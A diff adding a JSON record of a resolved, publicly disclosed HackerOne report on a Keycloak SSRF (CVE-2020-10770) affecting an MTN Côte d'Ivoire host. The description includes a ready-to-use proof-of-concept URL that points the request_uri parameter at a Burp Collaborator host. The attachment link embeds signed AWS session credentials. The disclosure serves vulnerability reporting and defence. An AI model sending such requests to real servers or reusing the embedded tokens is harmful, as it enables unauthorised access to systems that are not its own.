@@ -1,0 +1,133 @@
+{
+  "id": 1379080,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzc5MDgw",
+  "url": "https://hackerone.com/reports/1379080",
+  "title": "SSRF Keycloak before 13.0.0 - CVE-2020-10770 on https://sponsoredata.mtn.ci",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-10-23T03:13:38.665Z",
+  "submitted_at": "2021-10-23T03:13:38.720Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "renzi",
+    "url": "/renzi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/afqZzc2TZ8uPfCNAFcaSkTiC/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41919,
+    "url": "https://hackerone.com/mtn_group",
+    "handle": "mtn_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MTN Group",
+      "twitter_handle": "",
+      "website": "https://www.mtn.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-10770"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-09-26T01:40:21.753Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-08-27T01:40:11.106Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "##Vulnerable Website URL or Application:\nhttps://sponsoredata.mtn.ci\n\n##Description of Security Issue:\nA flaw was found in Keycloak before 13.0.0, where it is possible to force the server to call out an unverified URL using the OIDC parameter request_uri. This flaw allows an attacker to use this parameter to execute a Server-side request forgery (SSRF) attack.\n\n##Steps needed to reproduce bug:\n1.Using Burp Suite with Burp Collaborator send this request:\n\n* https://sponsoredata.mtn.ci:8443/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://0rs71imlpr20qx2svt6gfrotakga4z.burpcollaborator.net \n\n{F1490828}\n\nReference:\n* https://nvd.nist.gov/vuln/detail/CVE-2020-10770\n* http://packetstormsecurity.com/files/164499/Keycloak-12.0.1-Server-Side-Request-Forgery.html\n\n## Impact\n\nSSRF and External Interaction",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1490828,
+      "file_name": "imagem_2021-10-23_001239.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dvux9zj3mue812rvzex7tepboub9?response-content-disposition=attachment%3B%20filename%3D%22imagem_2021-10-23_001239.png%22%3B%20filename%2A%3DUTF-8%27%27imagem_2021-10-23_001239.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQREMC7CON%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T180620Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCW8SxQKgARnLryAh2r4n3odN%2B7zqFhHLBFpGvgAn4XGQIhALV8j%2BDSVqm9UmUGt2DO4qp5pLHNIMOJpyo%2BQr4jZzIdKrsFCO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzz%2FcwnvkPCLs%2Bn6ygqjwV3N4a%2FZ0EATSX1wO%2Bd%2F9a4sFO6Mt858m3ydeh4j2%2BqqKgVb9fLUqWZQ3Xmx8UrY2Jf77ASqF10QqWvu5mjhlL%2F6cJVHqOqGfS1YHTxePFExVYWJW0mX9DONhiwDrcFQLe6DMPyTeYR9bFqemJKpl4W0Lq0mBgjk2J9L7vjh9lmdSMB4mW4bwDlytP%2B2OOXnfUPo0Ue3CLKUgn7VKZPMNGMod8rA1p1Nj2o8GDxDQz8S9B9GWeiNrQfKMx1j1yZzUmUiJWYYZg6VPKQd%2Fh6zYAbXPqMB%2B%2BeYrNZaOFzPzwOG7lz3sie7Zq7J2P4WTqz7cIDi8ljg%2BXpQNu1NXVgFuLw05lTmJyAurl8%2F7XqwxcAr%2F3WyKzTA%2BN3MidnphMoj9k0FIhqGYXLon9kWmvgmOuS2N%2Bi1Bz6dFV%2FFoCh0inpBfQQf6i10%2FwuwAsDIqOnV%2F%2BsA6UQx0nIY1BZz%2Fu43hkfkcs%2B4emD%2BwTox%2BXml7bT3PyhNAONbvlX%2BjYFGSsu7%2BIT82VvjaOHI4IsYtryLUHHku1lde74QudXzS5Am6sbCGdn28GddjTRySk0O1VctM8gf7kLszOuunYtzmI%2F60PGxa8%2FKfHIIzYH0xHPgB7ZyjWCrbq78RXvAoyRnfnKzgDeuPP6kt%2Fmw%2Bn55w2gkhfYV8yWgFq44AQd%2FO7GQhS6uYp0kYsYocWSYyXa8aaKrcll4f1tA6oisyBTb5pzXLwukKj8q7hpMQCyXrKYULgrq1rwLMpUhMi91AEHWm%2FLmP8LtrrYdGaptsjtLzHdKzyfuCGCmmDyXS2O7gkVx3S3TIPZ8BlVvBNPeFh%2FY2AILsegfWYoGHx2Q6h3aohdbdWqAHWRhkqdFirzl%2BWKCUAzMI3ausYGOrABMUFpfpVhbtSigmBVkvXCN%2FGp5olQ43QMjeJxuPdkJr0Fk%2FUK2lCX0avcZTMgAcB8v%2FQrrd3%2Bl%2BHr0R%2FBCDD9ZgoXNh5Bs%2Bt6BlNJOLEuPeXscn3g%2FxGeNJRbaq1iW9c2cGZgqYwCB4eSCi3VOE7kvGz8sbUTPOdQOuINtDKGv%2BBSVbxIVtIkLo0cDeLpp621mg%2F4Mrq6KjHRapHnYIEjGudjLEEElfe0kgRyJajdUUw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=38008a1669018b5f716c0e243b07996e82cdb2457eace09b71705367c6050b91",
+      "file_size": 246974,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2024-09-26T01:40:11.336Z",
+  "allow_singular_disclosure_after": -31076769.14200574,
+  "singular_disclosure_allowed": true,
+  "vote_count": 55,
+  "voters": [
+    "orange303",
+    "z_cypher",
+    "odaysec",
+    "thalaivar304",
+    "spaghettisec",
+    "mohaned0101",
+    "aliyueka",
+    "mr-inspector",
+    "jackhavoltrey",
+    "fryad_cb010",
+    "and 45 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 34313,
+    "asset_type": "URL",
+    "asset_identifier": "mtn.ci",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
